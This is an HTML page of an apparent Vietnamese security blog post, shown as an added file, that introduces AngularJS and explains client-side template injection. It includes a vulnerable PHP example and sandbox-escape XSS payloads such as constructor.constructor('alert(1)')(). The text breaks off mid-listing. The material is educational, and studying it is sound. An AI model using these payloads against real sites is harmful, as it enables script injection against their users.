@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="AngularJSAngularJS là gìAngularJS là một framework front-end mã nguồn mở dựa trên Javascript được sử dụng để phát triển các ứng dụng web đơn trang (Single Page web Application - SPAs). Nó được dùng">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Client Side Template Injection with AngularJS">
+<meta property="og:url" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/index.html">
+<meta property="og:site_name" content="haonika&#39;s blog">
+<meta property="og:description" content="AngularJSAngularJS là gìAngularJS là một framework front-end mã nguồn mở dựa trên Javascript được sử dụng để phát triển các ứng dụng web đơn trang (Single Page web Application - SPAs). Nó được dùng">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/image2.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/image.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/image3.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/image4.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/image5.png">
+<meta property="article:published_time" content="2026-04-14T07:37:52.000Z">
+<meta property="article:modified_time" content="2026-04-17T10:30:20.454Z">
+<meta property="article:author" content="Duong Quang Hao">
+<meta property="article:tag" content="blog">
+<meta property="article:tag" content="research">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/image2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Client Side Template Injection with AngularJS</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/01/srdnlen-ctf-2026-quals/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&text=Client Side Template Injection with AngularJS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&is_video=false&description=Client Side Template Injection with AngularJS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Client Side Template Injection with AngularJS&body=Check out this article: https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&title=Client Side Template Injection with AngularJS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&name=Client Side Template Injection with AngularJS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2026/04/14/client-side-template-injection-with-angularjs/&t=Client Side Template Injection with AngularJS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AngularJS"><span class="toc-number">1.</span> <span class="toc-text">AngularJS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">AngularJS là gì</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mot-so-tinh-nang-cua-AngularJS"><span class="toc-number">1.2.</span> <span class="toc-text">Một số tính năng của AngularJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS-vs-Angular"><span class="toc-number">1.3.</span> <span class="toc-text">AngularJS vs Angular</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-without-HTML-Client-Side-Template-Injection-with-AngularJS"><span class="toc-number">2.</span> <span class="toc-text">XSS without HTML: Client-Side Template Injection with AngularJS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gioi-thieu"><span class="toc-number">2.1.</span> <span class="toc-text">Giới thiệu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sandbox"><span class="toc-number">2.2.</span> <span class="toc-text">Sandbox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tai-lieu-tham-khao"><span class="toc-number">3.</span> <span class="toc-text">Tài liệu tham khảo</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Client Side Template Injection with AngularJS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Duong Quang Hao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-04-14T07:37:52.000Z" class="dt-published" itemprop="datePublished">2026-04-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/blog/" rel="tag">blog</a>, <a class="p-category" href="/tags/research/" rel="tag">research</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <img src="/2026/04/14/client-side-template-injection-with-angularjs/image2.png" class="">
+
+<h2 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h2><h3 id="AngularJS-la-gi"><a href="#AngularJS-la-gi" class="headerlink" title="AngularJS là gì"></a>AngularJS là gì</h3><p>AngularJS là một framework front-end mã nguồn mở dựa trên Javascript được sử dụng để phát triển các ứng dụng web đơn trang (Single Page web Application - SPAs). Nó được dùng để thay đổi HTML tĩnh sang HTML động.</p>
+<p>AngularJS phát triển nhanh chóng, phiên bản cuối cùng là <code>1.8.3</code>. </p>
+<h3 id="Mot-so-tinh-nang-cua-AngularJS"><a href="#Mot-so-tinh-nang-cua-AngularJS" class="headerlink" title="Một số tính năng của AngularJS"></a>Một số tính năng của AngularJS</h3><ul>
+<li>Kiến trúc MVC: Tách ứng dụng thành 3 thành phần được kết nối với nhau, giúp code có tổ chức và dễ quản lý hơn.</li>
+<li>Two-way Data Binding: Tự động đồng bộ dữ liệu giữa View và Model, giảm số lượng mã.</li>
+<li>Directives: Thẻ HTML custom làm tăng chức năng chức năng các element và tạo các thành phần có thể tái sử dụng.</li>
+<li>Dependency Injection: Quản lý dependencies giữa các thành phần khác nhau.</li>
+<li>Routing: Hỗ trợ định tuyến cho phép developer tạo ra ứng dụng một trang với nhiều chế độ xem.</li>
+</ul>
+<p><strong>Ví dụ</strong>: <code>String interpolation</code> trong AngularJS</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=</span></span><br><span class="line"><span class="tag"><span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:green&quot;</span>&gt;</span></span><br><span class="line">        GeeksforGeeks</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">        AngularJS String Interpolation</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>=<span class="string">&quot;&quot;</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">ng-init</span>=<span class="string">&quot;Course=&#x27;AngularJS&#x27;;</span></span></span><br><span class="line"><span class="string"><span class="tag">                  Subject=&#x27;Tutorial&#x27;; </span></span></span><br><span class="line"><span class="string"><span class="tag">                  Company=&#x27;GeeksforGeeks&#x27;;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            Learn &#123;&#123; Course + &quot; &quot; + Subject &#125;&#125; from </span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=</span></span><br><span class="line"><span class="tag"><span class="string">&quot;https://www.geeksforgeeks.org/angular-js/angularjs/&quot;</span>&gt;</span>&#123;&#123;Company&#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Output</strong></p>
+<img src="/2026/04/14/client-side-template-injection-with-angularjs/image.png" class="">
+
+<h3 id="AngularJS-vs-Angular"><a href="#AngularJS-vs-Angular" class="headerlink" title="AngularJS vs Angular"></a>AngularJS vs Angular</h3><p>Angular là framework Typescript mã nguồn mở được tạo bởi Google để phát triển ứng dụng web. Front-end dev thường sử dụng các framework như <code>Angular</code> hay <code>React</code> để hiển thị và thao tác dữ liệu hiệu quả.</p>
+<p><strong>Ví dụ</strong>: <code>String interpolation</code> trong Angular.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--app.component.html--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span></span></span><br><span class="line"><span class="tag">    [<span class="attr">style.color</span>]=<span class="string">&quot;&#x27;green&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    [<span class="attr">style.font-family</span>]=<span class="string">&quot;&#x27;Arial&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    [<span class="attr">style.text-align</span>]=<span class="string">&quot;&#x27;center&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    &#123;&#123; title &#125;&#125; : &#123;&#123; about &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> [<span class="attr">style.font-weight</span>]=<span class="string">&quot;&#x27;bolder&#x27;&quot;</span>&gt;</span></span><br><span class="line">    This example illustrates &#123;&#123; data &#125;&#125; in Angular.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.component.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@angular/core&quot;</span>;</span><br><span class="line"><span class="meta">@Component</span>(&#123;</span><br><span class="line">    <span class="attr">selector</span>: <span class="string">&quot;my-app&quot;</span>,</span><br><span class="line">    <span class="attr">templateUrl</span>: <span class="string">&quot;./app.component.html&quot;</span>,</span><br><span class="line">    <span class="attr">styleUrls</span>: [<span class="string">&quot;./app.component.css&quot;</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppComponent</span> &#123;</span><br><span class="line">    title = <span class="string">&quot;GeeksforGeeks&quot;</span>;</span><br><span class="line">    about = <span class="string">&quot;Learning Portal for Geeks&quot;</span>;</span><br><span class="line">    data = <span class="string">&quot;String Interpolation&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Danh mục</th>
+<th align="left">AngularJS</th>
+<th align="left">Angular</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Kiến trúc</strong></td>
+<td align="left">Hỗ trợ thiết kế <strong>Model-View-Controller (MVC)</strong>. View xử lý thông tin có sẵn trong Model để tạo ra đầu ra.</td>
+<td align="left">Sử dụng các <strong>component (thành phần)</strong> và <strong>directives (chỉ thị)</strong>. Component thực chất là các directive có kèm theo template.</td>
+</tr>
+<tr>
+<td align="left"><strong>Ngôn ngữ lập trình</strong></td>
+<td align="left">Được viết bằng <strong>JavaScript</strong>.</td>
+<td align="left">Được viết bằng ngôn ngữ <strong>TypeScript</strong> của Microsoft, là một tập siêu (superset) của ECMAScript 6 (ES6).</td>
+</tr>
+<tr>
+<td align="left"><strong>Hỗ trợ di động</strong></td>
+<td align="left">Không hỗ trợ các trình duyệt di động.</td>
+<td align="left">Được hỗ trợ bởi tất cả các trình duyệt di động phổ biến.</td>
+</tr>
+<tr>
+<td align="left"><strong>Cú pháp biểu thức</strong></td>
+<td align="left">Sử dụng <code>ng-bind</code> để ràng buộc dữ liệu từ View sang Model và ngược lại.</td>
+<td align="left">Sử dụng các thuộc tính được bao quanh bởi dấu <code>()</code> và <code>[]</code> để ràng buộc dữ liệu giữa View và Model.</td>
+</tr>
+<tr>
+<td align="left"><strong>Ngôn ngữ hỗ trợ</strong></td>
+<td align="left">Chỉ hỗ trợ JavaScript.</td>
+<td align="left">Hỗ trợ cả TypeScript và JavaScript.</td>
+</tr>
+<tr>
+<td align="left"><strong>Điều tuyến (Routing)</strong></td>
+<td align="left">Sử dụng <code>$routeprovider.when()</code> để cấu hình điều tuyến.</td>
+<td align="left">Sử dụng <code>@RouteConfig&#123;(...)&#125;</code> để cấu hình điều tuyến.</td>
+</tr>
+<tr>
+<td align="left"><strong>Cấu trúc</strong></td>
+<td align="left">Khó quản lý hơn khi so sánh với Angular.</td>
+<td align="left">Có cấu trúc tốt hơn, dễ dàng tạo và bảo trì cho các ứng dụng lớn, nhưng phức tạp hơn AngularJS đối với các ứng dụng nhỏ.</td>
+</tr>
+<tr>
+<td align="left"><strong>CLI (Giao diện dòng lệnh)</strong></td>
+<td align="left">Không đi kèm với công cụ CLI.</td>
+<td align="left">Đi kèm với công cụ <strong>Angular CLI</strong>.</td>
+</tr>
+<tr>
+<td align="left"><strong>Ứng dụng ví dụ</strong></td>
+<td align="left">iStock, Netflix và trang web chính thức của AngularJS.</td>
+<td align="left">Upwork, Gmail và Wikiwand.</td>
+</tr>
+</tbody></table>
+<h2 id="XSS-without-HTML-Client-Side-Template-Injection-with-AngularJS"><a href="#XSS-without-HTML-Client-Side-Template-Injection-with-AngularJS" class="headerlink" title="XSS without HTML: Client-Side Template Injection with AngularJS"></a>XSS without HTML: Client-Side Template Injection with AngularJS</h2><h3 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu"></a>Giới thiệu</h3><p>Khi bạn xem mã nguồn của một trang web sử dụng Angular (view-source), bạn sẽ thấy thuộc tính <code>ng-app</code>.<br>Template: Những gì bạn thấy trong mã nguồn HTML thực chất chỉ là một template.<br>Rendering: Khi trình duyệt tải trang, thư viện Angular sẽ quét qua HTML này, tìm các chỉ thị (directives) như ng-app và biến các đoạn mã tĩnh thành nội dung động.<br>Đây là phần quan trọng nhất về bảo mật. Nếu ứng dụng cho phép nội dung do người dùng nhập vào (user input) hiển thị trực tiếp lên trang web mà không được xử lý kỹ, kẻ tấn công có thể chèn mã độc.</p>
+<p><strong>Tại sao HTML-encoding vẫn không an toàn?</strong></p>
+<p>Thông thường, để chống lại lỗi XSS, các lập trình viên sẽ mã hóa các ký tự đặc biệt (ví dụ: biến <code>&lt;</code> thành <code>&amp;lt;</code>).<br>Tuy nhiên, Angular không quan tâm đến các ký tự HTML đó. Nó tìm kiếm các Biểu thức (Expressions) nằm trong cặp dấu ngoặc nhọn kép <code>&#123;&#123; &#125;&#125;</code>.<br>Nếu kẻ tấn công nhập vào: <code>&#123;&#123; 7 * 7 &#125;&#125;</code>, Angular sẽ thực thi phép tính này và hiển thị <code>49</code> trên màn hình. Điều này chứng tỏ kẻ tấn công có thể thực thi mã JavaScript tùy ý trong ngữ cảnh của Angular.</p>
+<p>Test thêm tại: <code>https://jsfiddle.net/2zs2yv7o/</code></p>
+<p><code>&#123;&#123;1+1&#125;&#125;</code> -&gt; <code>2</code></p>
+<p>Hai ví dụ sau nói lên bản chất của lỗ hổng.</p>
+<p>Ví dụ đầu tiên, trang này nhúng input động của người dùng, tuy nhiên ví dụ này không bị XSS do sử dụng <code>htmlspecialchars</code> để HTML encode. </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$q = $_GET[&#x27;q&#x27;];</span></span><br><span class="line"><span class="meta">echo htmlspecialchars($q,ENT_QUOTES);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Ví dụ thứ 2 này cũng tương tự, tuy nhiên ở đây AngularJS có cách xử lý khác, có thể thêm expression và bypass sandbox -&gt; XSS</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$q = $_GET[&#x27;q&#x27;];</span></span><br><span class="line"><span class="meta">echo htmlspecialchars($q,ENT_QUOTES);?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Nếu thấy một trang sử dụng Angular template -&gt; dễ XSS hơn -&gt; Giải pháp sử dụng sandbox -&gt; Vẫn có cách bypass sandbox.   </p>
+<h3 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h3><p>Angular expression điều được sandbox. Để khai thác, ta cần thoát khỏi sandbox và thực thi mã Javascript tùy ý.</p>
+<p>Khi sử dụng payload <code>&#123;&#123;1 + 1&#125;&#125;</code> thì expression này được phân tích, parse, viết lại và thực thi bởi Angular.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">plus</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">return</span> fn;</span><br></pre></td></tr></table></figure>
+
+<p>Ví dụ khác với expression <code>&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span>&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/14/client-side-template-injection-with-angularjs/image3.png" class="">
+
+<p>Đây là kết quả được viết lại</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;constructor&#x27;</span> <span class="keyword">in</span> l),</span><br><span class="line">        v5;</span><br><span class="line">    <span class="keyword">if</span> (!(v4)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s) &#123;</span><br><span class="line">            v3 = s.<span class="property">constructor</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v3 = l.<span class="property">constructor</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">ensureSafeObject</span>(v3, text);</span><br><span class="line">    <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;</span><br><span class="line">        v2 = <span class="title function_">ensureSafeObject</span>(v3.<span class="property">constructor</span>, text);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v2 = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 